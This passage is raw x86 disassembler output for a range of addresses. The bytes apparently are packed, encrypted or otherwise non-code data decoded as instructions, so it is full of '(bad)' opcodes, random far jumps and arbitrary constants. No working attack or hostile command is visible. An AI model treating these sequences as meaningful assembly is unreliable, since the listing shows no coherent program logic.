  42271f:	stos   BYTE PTR es:[edi],al
  422720:	push   ds
  422721:	imul   edi,DWORD PTR [edx],0xffffffec
  422724:	sub    al,0xce
  422726:	xlat   BYTE PTR ds:[ebx]
  422727:	inc    ebx
  422728:	mov    ecx,0xc4038c16
  42272d:	dec    edx
  42272e:	nop
  42272f:	adc    al,0xdb
  422731:	rcr    ah,1
  422733:	gs clc 
  422735:	inc    esi
  422736:	cmp    al,0x5c
  422738:	(bad)  
  422739:	xchg   esi,eax
  42273a:	leave  
  42273b:	leave  
  42273c:	mov    dl,0x8d
  42273e:	add    ecx,DWORD PTR [ebp+0xe525]
	...
  4227b4:	shl    DWORD PTR [eax-0x6061f47],1
  4227ba:	fnstenv [ecx-0x69b500ed]
  4227c0:	jae    0x4227b2
  4227c2:	sub    al,0x11
  4227c4:	loop   0x422836
  4227c6:	add    DWORD PTR [eax],eax
  4227c8:	test   BYTE PTR [eax],0x0
  4227cb:	add    bh,bh
  4227cd:	es dec ecx
  4227cf:	sti    
  4227d0:	xchg   edx,eax
  4227d1:	xchg   esi,eax
  4227d2:	or     DWORD PTR [ebx-0x63],esi
  4227d5:	(bad)  
  4227d7:	shr    BYTE PTR [ebx],0xd0
  4227da:	inc    esi
  4227db:	hlt    
  4227dc:	sbb    eax,0x10bae68
  4227e1:	adc    al,0x23
  4227e3:	mov    ch,0x17
  4227e5:	dec    esi
  4227e6:	mov    cl,0xf5
  4227e8:	push   esi
  4227e9:	dec    esp
  4227ea:	clc    
  4227eb:	push   esp
  4227ec:	out    0x1d,eax
  4227ee:	or     BYTE PTR [edx],dl
  4227f0:	mov    edx,0x9a63076a
  4227f5:	xchg   edi,eax
  4227f6:	mov    ebp,0x423b06b0
  4227fb:	ret    0x7b55
  4227fe:	adc    eax,0x565680d9
  422803:	cmp    bl,al
  422805:	loope  0x42283a
  422807:	xchg   BYTE PTR [edx+0x27c556b1],cl
  42280d:	scas   eax,DWORD PTR es:[edi]
  42280e:	hlt    
  42280f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422810:	ja     0x4227d5
  422812:	pusha  
  422813:	add    dh,BYTE PTR [esi+0xb6f32ea]
  422819:	outs   dx,BYTE PTR ds:[esi]
  42281a:	fidiv  WORD PTR [esi-0x4110ae1d]
  422820:	cmc    
  422821:	fucom  st(3)
  422823:	jmp    0x422889
  422825:	vorps  ymm3,ymm2,YMMWORD PTR [eax-0x1f471eb0]
  42282d:	or     ecx,ebp
  42282f:	dec    edx
  422830:	push   eax
  422831:	rcr    BYTE PTR [edi],1
  422833:	pop    ds
  422834:	push   es
  422835:	lock mov ebx,0x5bf3962a
  42283b:	shr    DWORD PTR [ebx+ecx*1+0x16],cl
  42283f:	and    BYTE PTR [edx+0x75],bh
  422842:	inc    edx
  422843:	jecxz  0x422813
  422845:	push   0x2
  422847:	int    0x9c
  422849:	or     ebp,edi
  42284b:	cld    
  42284c:	aas    
  42284d:	(bad)  
  42284e:	xchg   esp,eax
  42284f:	pushf  
  422850:	mov    cl,0xa3
  422852:	push   edx
  422853:	mov    ah,0x58
  422855:	mov    WORD PTR [ebx],?
  422857:	je     0x4227db
  422859:	jb     0x42285f
  42285b:	ins    BYTE PTR es:[edi],dx
  42285c:	out    dx,eax
  42285d:	xchg   ebp,eax
  42285e:	stos   DWORD PTR es:[edi],eax
  42285f:	jecxz  0x4228b3
  422861:	gs dec ecx
  422863:	push   0xffffffc0
  422865:	mov    ch,0xac
  422867:	jns    0x422811
  422869:	aaa    
  42286a:	mov    esi,0x29d25c38
  42286f:	imul   esi,DWORD PTR [ecx],0x410395e4
  422875:	xlat   BYTE PTR ds:[ebx]
  422876:	dec    esp
  422877:	ret    
  422878:	fcom   DWORD PTR [ecx]
  42287a:	adc    al,0x19
  42287c:	addr16 ja 0x422850
  42287f:	pusha  
  422880:	jmp    0x5efd:0x71c3bd48
  422887:	cmc    
  422888:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422889:	jns    0x422900
  42288b:	xchg   ebx,eax
  42288c:	mov    al,0xea
  42288e:	mov    DWORD PTR [esi-0x2f],0x22357e8c
  422895:	mov    ah,0x29
  422897:	cdq    
  422898:	jne    0x422873
  42289a:	xchg   esi,eax
  42289b:	mov    dh,0x75
  42289d:	dec    esp
  42289e:	jg     0x4228c5
  4228a0:	pop    esp
  4228a1:	sub    BYTE PTR [ebp-0x361f5e15],ah
  4228a7:	or     al,0xa7
  4228a9:	shl    BYTE PTR [edi+edi*1],1
  4228ac:	imul   DWORD PTR [ebx+ebx*4]
  4228af:	sbb    ch,ch
  4228b1:	mov    bl,BYTE PTR [ebp-0x7b8d7a2]
  4228b7:	mov    DWORD PTR [edx+esi*8-0x28353738],esp
  4228be:	stos   BYTE PTR es:[edi],al
  4228bf:	mov    eax,0x2ec1
	...
  422934:	(bad)  
  422935:	cld    
  422936:	je     0x422955
  422938:	jbe    0x4228d7
  42293a:	(bad)  
  42293b:	jmp    ebx
  42293d:	lea    ecx,[ebx]
  42293f:	xchg   esp,eax
  422940:	mov    dh,0xc3
  422942:	xchg   ecx,eax
  422943:	add    bl,al
  422945:	jno    0x422948
  422947:	add    dh,dh
  422949:	add    BYTE PTR [eax],al
  42294b:	add    BYTE PTR [edx-0x28],bl
  42294e:	adc    bh,bl
  422950:	mov    eax,ds:0xa5a958f7
  422955:	push   DWORD PTR [eax-0x6e]
  422958:	sar    DWORD PTR [edi],1
  42295a:	lea    eax,[esi]
  42295c:	(bad)  
  42295d:	shr    DWORD PTR [ebx+0x4599fba1],1
  422963:	sbb    eax,0x180dceb5
  422968:	iret   
  422969:	fidivr WORD PTR [ebx+0x10]
  42296c:	jmp    0x422947
  42296e:	call   0xb97:0x3b75bc19
  422975:	push   edi
  422976:	pop    ss
  422977:	or     DWORD PTR [edi-0x42014e27],ebx
  42297d:	pop    ebx
  42297e:	or     eax,0x2a97efbd
  422983:	jmp    0x688d8b
  422988:	fidivr WORD PTR [edx+0x5197141c]
  42298e:	dec    edi
  42298f:	call   0x491e:0xe8dbf02e
  422996:	mov    DWORD PTR [esi-0x5059d08f],eax
  42299c:	retf   
  42299d:	nop
  42299e:	mov    edx,0x360d046d
  4229a3:	mov    ecx,ecx
  4229a5:	outs   dx,DWORD PTR ds:[esi]
  4229a6:	xchg   BYTE PTR [esp+edx*4-0x58],ch
  4229aa:	mov    bh,0x7f
  4229ac:	lods   eax,DWORD PTR ds:[esi]
  4229ad:	adc    eax,0x1659082f
  4229b2:	push   ss
  4229b3:	cmp    DWORD PTR [ecx+0x74],edx
  4229b6:	ret    0x1bf7
  4229b9:	cmp    BYTE PTR [edi+0x27],ah
  4229bc:	mov    ch,BYTE PTR [ecx+0x7629eb36]
  4229c2:	test   eax,0x735859e
  4229c7:	fidiv  DWORD PTR [eax]
  4229c9:	daa    
  4229ca:	aam    0x3e
  4229cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229cd:	div    DWORD PTR [esi-0x69ec8c4b]
  4229d3:	dec    ebp
  4229d4:	jo     0x422a29
  4229d6:	call   0xfeb5:0x49115869
  4229dd:	add    eax,DWORD PTR [eax]
  4229df:	iret   
  4229e0:	fs xchg esi,eax
  4229e2:	mov    ch,BYTE PTR [ecx-0x43]
  4229e5:	xchg   al,dh
  4229e7:	and    eax,0x1d33d491
  4229ec:	outs   dx,DWORD PTR ds:[esi]
  4229ed:	das    
  4229ee:	icebp  
  4229ef:	fucomip st,st(4)
  4229f1:	xor    edx,ebx
  4229f3:	cli    
  4229f4:	xor    DWORD PTR [edx+0x32e52322],eax
  4229fa:	xchg   ecx,eax
  4229fb:	sbb    al,0x44
  4229fd:	jmp    0x422a37
  4229ff:	fidivr DWORD PTR [ecx+eiz*1+0x6b]
  422a03:	psubq  mm7,QWORD PTR fs:[ebx*1+0x5b7442d6]
  422a0c:	(bad)  
  422a0d:	dec    edx
  422a0e:	dec    edi
  422a0f:	sub    bl,dh
  422a11:	cmc    
  422a12:	push   0xff8a6a39
  422a17:	add    bh,BYTE PTR [eax]
  422a19:	in     eax,dx
  422a1a:	out    dx,al
  422a1b:	mov    edi,0xc21b3d0f
  422a20:	(bad)  
  422a21:	test   al,0xce
  422a23:	add    esi,DWORD PTR [esi-0x1509d072]
  422a29:	(bad)  
  422a2a:	stos   BYTE PTR es:[edi],al
  422a2b:	inc    edx
  422a2c:	xchg   BYTE PTR [edx-0x11],al
  422a2f:	jo     0x422a40
  422a31:	shl    esi,cl
  422a33:	xchg   BYTE PTR [ecx+0x6698fd34],ah
  422a39:	scas   eax,DWORD PTR es:[edi]
  422a3a:	fsubr  st,st(2)
  422a3c:	neg    BYTE PTR [edx-0x698e526e]
	...
  422ab2:	add    BYTE PTR [eax],al
  422ab4:	push   ss
  422ab5:	cdq    
  422ab6:	jmp    0x37401a88
  422abb:	fcmovnbe st,st(0)
  422abd:	cld    
  422abe:	xor    al,0xd0
  422ac0:	cwd    
  422ac2:	inc    ebp
  422ac3:	enter  0x72ce,0x1
  422ac7:	add    dh,dh
  422ac9:	add    BYTE PTR [eax],al
  422acb:	add    BYTE PTR [ebp-0x19],dl
  422ace:	mov    dl,0xda
  422ad0:	dec    ebx
  422ad1:	stos   BYTE PTR es:[edi],al
  422ad2:	mul    DWORD PTR [eax]
  422ad4:	(bad)  
  422ad5:	jmp    0x422ab6
  422ad7:	pop    esp
  422ad8:	and    al,BYTE PTR [esi+0x23]
  422adb:	inc    eax
  422adc:	pop    esi
  422add:	icebp  
  422ade:	lahf   
  422adf:	inc    esi
  422ae0:	xchg   ecx,eax
  422ae1:	or     ch,BYTE PTR [esi-0x13]
  422ae4:	imul   eax,DWORD PTR [ebx+0x22837f4f],0x80172743
  422aee:	add    BYTE PTR [ecx+eiz*4+0x28],0xca
  422af3:	in     eax,0xe4
  422af5:	add    ebp,DWORD PTR [esi+ecx*8-0x60]
  422af9:	fisttp QWORD PTR [ebp+0x3a]
  422afc:	adc    ebx,DWORD PTR [eax-0x5]
  422aff:	jmp    0x422b4d
  422b01:	xor    ch,ah
  422b03:	outs   dx,DWORD PTR ds:[esi]
  422b04:	nop
  422b05:	mov    bl,0x61
  422b07:	pop    edi
  422b08:	cmp    al,0x1
  422b0a:	mov    al,ds:0xbe7d91c4
  422b0f:	enter  0x982f,0xf0
  422b13:	mov    dh,0x9f
  422b15:	fwait
  422b16:	inc    ecx
  422b17:	jl     0x422b20
  422b19:	dec    ecx
  422b1a:	cmp    BYTE PTR [ecx],bl
  422b1c:	arpl   si,si
  422b1e:	dec    esp
  422b1f:	lds    edi,FWORD PTR [eax+0x5a]
  422b22:	pop    eax
  422b23:	lods   eax,DWORD PTR ds:[esi]
  422b24:	mov    eax,0x5925a8ba
  422b29:	nop
  422b2a:	pop    esp
  422b2b:	aam    0xe4
  422b2d:	repnz loop 0x422b7a
  422b30:	inc    edi
  422b31:	lea    esp,[ecx]
  422b33:	add    eax,0x55f9e6dd
  422b38:	test   DWORD PTR [ebx],0xe1413863
  422b3e:	jno    0x422ada
  422b40:	(bad)  
  422b42:	xor    ch,bl
  422b44:	fadd   QWORD PTR [esi+0x60]
  422b47:	(bad)  
  422b48:	jne    0x422b15
  422b4a:	mov    dl,cl
  422b4c:	and    BYTE PTR [esi+0x2b989c99],dh
  422b52:	adc    ebx,DWORD PTR [esi]
  422b54:	nop
  422b55:	into   
  422b56:	cmp    dl,dh
  422b58:	inc    edi
  422b59:	dec    ecx
  422b5a:	xor    al,BYTE PTR [esi-0x61]
  422b5d:	sub    ebp,ebx
  422b5f:	(bad)  
  422b60:	outs   dx,BYTE PTR ds:[esi]
  422b61:	das    
  422b62:	mov    WORD PTR [edi+eiz*2-0x62b7695c],?
  422b69:	and    DWORD PTR [ecx+ebx*1+0x26],0xa680f6f7
  422b71:	cwde   
  422b72:	(bad)  
  422b73:	outs   dx,DWORD PTR ds:[esi]
  422b74:	imul   eax,ebx,0x9018efa7
  422b7a:	rcl    esi,0x64
  422b7d:	pop    edx
  422b7e:	std    
  422b7f:	mov    ebp,eax
  422b81:	mov    al,0xb
  422b83:	outs   dx,BYTE PTR ds:[esi]
  422b84:	or     ebp,0x38
  422b87:	cmp    ch,BYTE PTR [ebp+0x72f22f23]
  422b8d:	mov    ebx,0x61811b98
  422b92:	add    BYTE PTR [edx+0xf],al
  422b95:	rcl    BYTE PTR ss:[ecx+0x45671444],0x15
  422b9d:	push   ebx
  422b9e:	pop    esp
  422b9f:	mov    esi,0x8e829363
  422ba4:	jb     0x422b63
  422ba6:	cld    
  422ba7:	aam    0x40
  422ba9:	push   ebp
  422baa:	imul   ecx,edx,0x4f
  422bad:	fmul   QWORD PTR [ebx+0x23]
  422bb0:	cmp    dl,BYTE PTR ds:0x98537103
  422bb6:	or     cl,bl
  422bb8:	pop    edi
  422bb9:	push   edx
  422bba:	ret    0xc015
  422bbd:	(bad)
  422bc0:	xor    ecx,ebx
	...
  422c32:	add    BYTE PTR [eax],al
  422c34:	mov    al,0x6b
  422c36:	mov    ch,0xe5
  422c38:	(bad)  
  422c39:	push   eax
  422c3b:	jg     0x422c9e
  422c3d:	pop    es
  422c3e:	jne    0x422bca
  422c40:	mov    bl,0x87
  422c42:	test   al,0x48
  422c44:	les    esi,FWORD PTR [ebx+0x1]
  422c47:	add    dh,dh
  422c49:	add    BYTE PTR [eax],al
  422c4b:	add    BYTE PTR [edi+0xf],cl
  422c4e:	mov    ds:0x932b9873,eax
  422c53:	aaa    
  422c54:	cmp    bl,BYTE PTR [bx+si-0x39]
  422c58:	and    BYTE PTR [eax+0x7515034c],bh
  422c5e:	dec    edi
  422c5f:	jns    0x422bf8
  422c61:	and    BYTE PTR ds:0x7ad4d1a2,0xf4
  422c68:	sub    BYTE PTR [ebp+0x5cab24c7],ch
  422c6e:	bound  eax,QWORD PTR [ebp-0x69]
  422c71:	imul   ebx,DWORD PTR [ebx+eax*1-0x2b],0xe43dc6f0
  422c79:	xor    ebp,DWORD PTR [ebp-0x45]
  422c7c:	push   ds
  422c7d:	lea    ebp,[ebp-0x3f357ec9]
  422c83:	dec    eax
  422c84:	sub    DWORD PTR [esi],ecx
  422c86:	pop    es
  422c87:	mov    ss,WORD PTR [esp+esi*1]
  422c8a:	jl     0x422c83
  422c8c:	sub    al,0x41
  422c8e:	imul   dl
  422c90:	dec    esi
  422c91:	adc    ch,BYTE PTR [edx+0x35]
  422c94:	data16 std 
  422c96:	mov    ch,0xa9
  422c98:	retf   
  422c99:	mov    BYTE PTR [ecx-0x66dbf1cc],ah
  422c9f:	cld    
  422ca0:	xor    al,BYTE PTR [eax]
  422ca2:	daa    
  422ca3:	push   eax
  422ca4:	adc    al,0xea
  422ca6:	test   eax,0x414fa8cb
  422cab:	pop    ebx
  422cac:	call   0x5009550e
  422cb1:	pop    edx
  422cb2:	ins    DWORD PTR es:[edi],dx
  422cb3:	dec    ebp
  422cb4:	inc    esi
  422cb5:	aad    0xb6
  422cb7:	mov    ds:0xea4fac8c,eax
  422cbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cbd:	dec    edx
  422cbe:	fisub  DWORD PTR [ebx-0x13ca13c]
  422cc4:	and    eax,ecx
  422cc6:	retf   0xc2e0
  422cc9:	repz loope 0x422ca5
  422ccc:	dec    eax
  422ccd:	inc    ebp
  422cce:	add    edi,0xffffff84
  422cd1:	jo     0x422cde
  422cd3:	imul   esp,DWORD PTR [esi],0x35
  422cd6:	div    DWORD PTR [ecx+0x10522dfe]
  422cdc:	test   eax,0x56492e14
  422ce1:	ins    BYTE PTR es:[edi],dx
  422ce2:	xchg   esi,eax
  422ce3:	xor    DWORD PTR [ebp-0x643f0af5],eax
  422ce9:	push   eax
  422cea:	(bad)  [edx+0x1afe5ff8]
  422cf0:	icebp  
  422cf1:	popa   
  422cf2:	(bad)  
  422cf3:	hlt    
  422cf4:	pop    ss
  422cf5:	push   0xdbc1cccb
  422cfa:	stos   DWORD PTR es:[edi],eax
  422cfb:	fidiv  WORD PTR [ebx]
  422cfd:	jmp    0x8fb148a7
  422d02:	inc    ecx
  422d03:	lds    edi,FWORD PTR ds:0x8c9b7f3b
  422d09:	push   esp
  422d0a:	vandnps ymm7,ymm7,YMMWORD PTR [ebx-0x79]
  422d0f:	ret    0xeca5
  422d12:	pop    ebx
  422d13:	cwde   
  422d14:	cwde   
  422d15:	jbe    0x422d2a
  422d17:	jmp    0x707f:0x653c4c98
  422d1e:	rcr    BYTE PTR [edx-0xbbf1540],1
  422d24:	js     0x422d3d
  422d26:	dec    ebp
  422d27:	int3   
  422d28:	mov    bh,0xe2
  422d2a:	adc    eax,0x19de773d
  422d2f:	pusha  
  422d30:	in     al,dx
  422d31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d32:	cs jne 0x422cb9
  422d35:	pmulhuw mm1,QWORD PTR [edx-0x4e5adbbd]
  422d3c:	icebp  
  422d3d:	jle    0x422cc9
  422d3f:	(bad)  
  422d41:	mov    al,BYTE PTR [eax]
	...
  422db3:	add    bh,cl
  422db5:	mov    eax,ds:0xbf7f851b
  422dba:	fucomip st,st(3)
  422dbc:	addr16 mov ecx,0x67e1f9f7
  422dc2:	in     al,dx
  422dc3:	fistp  QWORD PTR [edx-0x9fffe8c]
  422dc9:	add    BYTE PTR [eax],al
  422dcb:	add    BYTE PTR [ecx-0x435fef82],ah
  422dd1:	mov    ah,0xb4
  422dd3:	mov    ebx,0xb097a4ad
  422dd8:	pop    ebx
  422dd9:	call   0x32087264
  422dde:	sahf   
  422ddf:	sub    al,0x5d
  422de1:	scas   al,BYTE PTR es:[edi]
  422de2:	sbb    ebp,DWORD PTR [eax-0x6d]
  422de5:	popa   
  422de6:	bound  edx,QWORD PTR [ebp-0x1d]
  422de9:	xchg   edi,eax
  422dea:	mov    dh,0x3d
  422dec:	jns    0x422da1
  422dee:	mov    bh,0x2d
  422df0:	or     al,0x63
  422df2:	rcr    DWORD PTR [eax+0x402ef441],1
  422df8:	fsin   
  422dfa:	sub    cl,BYTE PTR [ebx+0x1e3a8dcd]
  422e00:	ss icebp 
  422e02:	cdq    
  422e03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e04:	sub    BYTE PTR [ecx-0x1d],0x8c
  422e08:	cmp    ebp,DWORD PTR [ebp+eax*1-0x5b9b0312]
  422e0f:	daa    
  422e10:	cld    
  422e11:	lahf   
  422e12:	(bad)  
  422e13:	lds    edx,FWORD PTR [esi-0x36bf5b1b]
  422e19:	js     0x422da1
  422e1b:	inc    edx
  422e1c:	mov    eax,ds:0x8abac6e4
  422e21:	ret    
  422e22:	sar    BYTE PTR [eax],cl
  422e24:	outs   dx,BYTE PTR ds:[esi]
  422e25:	xchg   DWORD PTR [ebx-0xbd0f8f6],edx
  422e2b:	fwait
  422e2c:	ret    
  422e2d:	xor    ah,BYTE PTR [edx-0x3b]
  422e30:	jns    0x422dc4
  422e32:	pop    ds
  422e33:	and    al,0x90
  422e35:	out    dx,eax
  422e36:	aas    
  422e37:	test   BYTE PTR [edx+0x6b],cl
  422e3a:	and    ebp,0x1f9d1f6c
  422e40:	iret   
  422e41:	out    0xc6,eax
  422e43:	div    DWORD PTR [eax]
  422e45:	adc    ebp,DWORD PTR [ecx+0x391ff851]
  422e4b:	(bad)
  422e4e:	in     eax,0x8f
  422e50:	sub    ebx,esp
  422e52:	sub    dh,BYTE PTR [ebx-0x75]
  422e55:	pusha  
  422e56:	(bad)  
  422e57:	int    0x88
  422e59:	shl    BYTE PTR [ebp+edi*2-0x27],1
  422e5d:	(bad)  
  422e5e:	pushf  
  422e5f:	out    0xc0,al
  422e61:	ss stos BYTE PTR es:[edi],al
  422e63:	jno    0x422e37
  422e65:	push   edi
  422e66:	sub    BYTE PTR ds:0x18479b69,dl
  422e6c:	adc    al,dl
  422e6e:	pop    esp
  422e6f:	push   0xffffffc9
  422e71:	bound  eax,QWORD PTR [eax]
  422e73:	push   ebx
  422e74:	inc    ebx
  422e75:	pop    ebp
  422e76:	push   cs
  422e77:	ja     0x422e4e
  422e79:	xor    BYTE PTR [edi+0x48],0x55
  422e7d:	jecxz  0x422e42
  422e7f:	js     0x422eca
  422e81:	rcl    BYTE PTR [ebp+0x6a2953a6],0xb1
  422e88:	bound  esp,QWORD PTR [ecx]
  422e8a:	dec    ebx
  422e8b:	cmp    eax,0x76c6c2b1
  422e90:	ret    0x8e2e
  422e93:	mov    dl,0xea
  422e95:	sbb    dl,BYTE PTR [ebx+eax*2]
  422e98:	ret    0x300d
  422e9b:	and    BYTE PTR [esi],bl
  422e9d:	es dec ebp
  422e9f:	mov    WORD PTR ds:0xb55eaa83,ss
  422ea5:	mov    ebx,0x2a533cfa
  422eaa:	sbb    DWORD PTR [esi-0x4f],esi
  422ead:	push   cs
  422eae:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422eb0:	jae    0x422f0d
  422eb2:	mov    esi,0x629bd569
  422eb7:	popf   
  422eb8:	stc    
  422eb9:	and    BYTE PTR ds:0x89f758f1,bl
  422ebf:	hlt    
  422ec0:	cmp    eax,0x48
	...
  422f31:	add    BYTE PTR [eax],al
  422f33:	add    BYTE PTR [ebx+0x6],ch
  422f36:	(bad)  
  422f37:	dec    edi
  422f38:	out    dx,eax
  422f39:	iret   
  422f3a:	jmp    0x422f62
  422f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f3d:	add    cl,BYTE PTR fs:[bp+si+0x6eb2]
  422f43:	(bad)  
  422f44:	mov    al,0x75
  422f46:	add    DWORD PTR [eax],eax
  422f48:	test   BYTE PTR [eax],0x0
  422f4b:	add    al,ah
  422f4d:	fild   DWORD PTR [edx]
  422f4f:	adc    BYTE PTR [ebx-0x1727aab4],al
  422f55:	push   ebx
  422f56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f57:	(bad)  
  422f58:	pop    edx
  422f59:	popa   
  422f5a:	cmp    DWORD PTR [eax-0x7b095fd9],ebp
  422f60:	push   edi
  422f61:	mov    ds:0xd712d265,al
  422f66:	push   ebp
  422f67:	cld    
  422f68:	stos   DWORD PTR es:[edi],eax
  422f69:	pop    ss
  422f6a:	shr    DWORD PTR [edi-0x767a989],cl
  422f70:	mov    BYTE PTR [eax],bh
  422f72:	les    ebx,FWORD PTR [ecx+0x120f7a2a]
  422f78:	fld    DWORD PTR [esi-0x37]
  422f7b:	loope  0x422f9f
  422f7d:	fdiv   QWORD PTR [ebp+ebx*4+0x7b]
  422f81:	mov    eax,0x660087d6
  422f86:	ror    DWORD PTR [ecx+0x6],1
  422f89:	mov    cl,0xe3
  422f8b:	push   ecx
  422f8c:	pop    es
  422f8d:	daa    
  422f8e:	loopne 0x422fd3
  422f90:	sub    ch,BYTE PTR [edx-0x69]
  422f93:	lahf   
  422f94:	mov    ebx,0x79a847a0
  422f99:	mov    ecx,0x68c2d5c7
  422f9e:	aam    0x5d
  422fa0:	sbb    bh,BYTE PTR [ecx+edi*8+0x575c5f9c]
  422fa7:	mov    cl,0x96
  422fa9:	adc    DWORD PTR [edi+0x24891df6],edx
  422faf:	push   ebx
  422fb0:	das    
  422fb1:	scas   al,BYTE PTR es:[edi]
  422fb2:	jg     0x422ff8
  422fb4:	xor    eax,ecx
  422fb6:	jbe    0x422fde
  422fb8:	das    
  422fb9:	xchg   esi,eax
  422fba:	xchg   BYTE PTR [edx+eiz*1-0x39],bl
  422fbe:	or     al,0x1a
  422fc0:	and    eax,0xe0f94f26
  422fc5:	xor    BYTE PTR [ecx],dh
  422fc7:	mov    cs,WORD PTR [ecx-0x4d]
  422fca:	push   0x4f
  422fcc:	mov    ebp,0x1f6bb1ff
  422fd1:	cmp    eax,0xd977a783
  422fd6:	jne    0x422fb0
  422fd8:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fda:	inc    esp
  422fdb:	sbb    al,0x22
  422fdd:	aad    0xd3
  422fdf:	out    dx,al
  422fe0:	jmp    0xb17d:0x88875bd8
  422fe7:	fist   DWORD PTR [ebx]
  422fe9:	aam    0x2f
  422feb:	cld    
  422fec:	cdq    
  422fed:	test   ah,dh
  422fef:	and    eax,0xfbd800a1
  422ff4:	inc    ebp
  422ff5:	frstor ds:0x97175022
  422ffb:	fs shr ecx,1
  422ffe:	mov    ecx,0x4191920
  423003:	xchg   edi,eax
  423004:	sub    BYTE PTR [eax+0xd8c297b],dh
  42300a:	dec    ebx
  42300b:	xor    al,0xe5
  42300d:	sbb    ch,BYTE PTR ds:0xb06a3b42
  423013:	and    bl,ch
  423015:	and    esi,eax
  423017:	icebp  
  423018:	frstor [edx+0x3f]
  42301b:	and    bh,BYTE PTR [edx-0x4f2bb360]
  423021:	ja     0x422ffb
  423023:	out    0x6a,al
  423025:	jp     0x423010
  423027:	repz dec eax
  423029:	jmp    0xd016f3de
  42302e:	pop    ds
  42302f:	adc    eax,0xc0b58c65
  423034:	scas   eax,DWORD PTR es:[edi]
  423035:	jecxz  0x422fe0
  423037:	sub    al,0x9d
  423039:	popf   
  42303a:	dec    eax
  42303b:	daa    
  42303c:	in     al,dx
  42303d:	mov    esi,DWORD PTR [esi]
  42303f:	jnp    0x422fe4
  423041:	xchg   edx,eax
	...
  4230b2:	add    BYTE PTR [eax],al
  4230b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230b5:	push   edx
  4230b6:	jnp    0x4230b5
  4230b8:	(bad)  
  4230b9:	std    
  4230ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230bb:	pop    ebx
  4230bc:	lods   eax,DWORD PTR ds:[esi]
  4230bd:	jne    0x423121
  4230bf:	xchg   ecx,eax
  4230c0:	jae    0x4230a2
  4230c2:	imul   esp,DWORD PTR [eax],0x176a6
  4230c8:	test   BYTE PTR [eax],0x0
  4230cb:	add    al,cl
  4230cd:	shr    BYTE PTR [ebx+0x5bfec103],cl
  4230d3:	add    DWORD PTR [ecx+0x3dad1d38],edx
  4230d9:	mov    edx,0x99bb94f
  4230de:	sbb    DWORD PTR [edi],ebx
  4230e0:	test   eax,0xe91b6ac1
  4230e5:	mov    esp,0xe1a148cf
  4230ea:	ret    0x3dd1
  4230ed:	neg    DWORD PTR [edi+0x763f3ce4]
  4230f3:	addr16 mov bl,0xb5
  4230f6:	mov    bl,0x6
  4230f8:	push   0x344983c0
  4230fd:	dec    esp
  4230fe:	sub    dh,0x1e
  423101:	cmp    BYTE PTR [ecx],bl
  423103:	jmp    0x73829a5f
  423108:	cmp    dh,bl
  42310a:	(bad)  
  42310b:	jp     0x4230e7
  42310d:	fisttp DWORD PTR [ebp+0x70e79766]
  423113:	lods   eax,DWORD PTR ds:[esi]
  423114:	fwait
  423115:	sub    ecx,esp
  423117:	inc    esp
  423118:	mov    edi,0xceefd6f2
  42311e:	call   0xa29939c6
  423123:	mov    esp,0xa47a9d9
  423128:	xrelease mov BYTE PTR [edx+0x72],al
  42312c:	sub    al,0x4a
  42312e:	and    BYTE PTR [edx-0x5ef30871],bl
  423134:	xchg   esp,eax
  423135:	inc    edx
  423136:	cwde   
  423137:	pop    ebx
  423138:	stos   DWORD PTR es:[edi],eax
  423139:	mov    cl,0xff
  42313b:	aas    
  42313c:	mov    esi,0xa98b90fe
  423141:	retf   0xfb49
  423144:	out    0x9e,eax
  423146:	cmp    dl,BYTE PTR [edx+0x6f9019ba]
  42314c:	cmp    al,0x8a
  42314e:	fs gs inc eax
  423151:	mov    dl,0xc8
  423153:	jge    0x423190
  423155:	cdq    
  423156:	cmp    eax,0x120b709
  42315b:	dec    ebx
  42315c:	pop    eax
  42315d:	cmp    BYTE PTR [ecx+0x4d026edc],bh
  423163:	cdq    
  423164:	leave  
  423165:	(bad)  
  423166:	in     eax,0x3
  423168:	call   0xae01f603
  42316d:	pop    edx
  42316e:	imul   edi,DWORD PTR [ecx],0x75
  423171:	lods   eax,DWORD PTR ds:[esi]
  423172:	xchg   ebp,eax
  423173:	mov    edx,eax
  423175:	or     al,0x8
  423177:	xchg   ebx,eax
  423178:	popf   
  423179:	and    eax,DWORD PTR [eax-0xd7d62f]
  42317f:	jo     0x42318e
  423181:	aas    
  423182:	mov    fs,WORD PTR [esi-0x2bc10624]
  423188:	clc    
  423189:	xchg   ebx,eax
  42318a:	cmp    ecx,0xffffff9d
  42318d:	int    0x9a
  42318f:	fild   QWORD PTR [esi-0x12710f14]
  423195:	adc    al,0x0
  423197:	cs loopne 0x4231c1
  42319a:	outs   dx,BYTE PTR ds:[esi]
  42319b:	pop    esi
  42319c:	mov    dh,0x6d
  42319e:	fucomi st,st(1)
  4231a0:	pop    eax
  4231a1:	shr    BYTE PTR ds:0x7051535c,1
  4231a7:	push   cs
  4231a8:	jge    0x4231ef
  4231aa:	cdq    
  4231ab:	out    dx,eax
  4231ac:	and    eax,0x56d6cf19
  4231b1:	sbb    eax,0x675d17f3
  4231b6:	jmp    0xe8fcda1f
  4231bb:	sub    dl,ch
  4231bd:	aam    0xca
  4231bf:	jo     0x4231bd
  4231c1:	inc    eax
	...
  423232:	add    BYTE PTR [eax],al
  423234:	(bad)  
  423235:	in     eax,dx
  423236:	lods   eax,DWORD PTR ds:[esi]
  423237:	imul   edi
  423239:	neg    edi
  42323b:	std    
  42323c:	stc    
  42323d:	idiv   DWORD PTR ds:0x3076feb0
  423243:	test   DWORD PTR [edi+esi*2+0xf60001],ebx
  42324a:	add    BYTE PTR [eax],al
  42324c:	cmp    eax,0xd4963e3
  423251:	add    ah,BYTE PTR [ebp+0x6870f37c]
  423257:	(bad)  
  423258:	push   ebx
  423259:	inc    ecx
  42325a:	jae    0x4232cf
  42325c:	mov    ecx,0xf4d3ce7
  423261:	ds pop edi
  423263:	jns    0x423296
  423265:	sti    
  423266:	data16 cld 
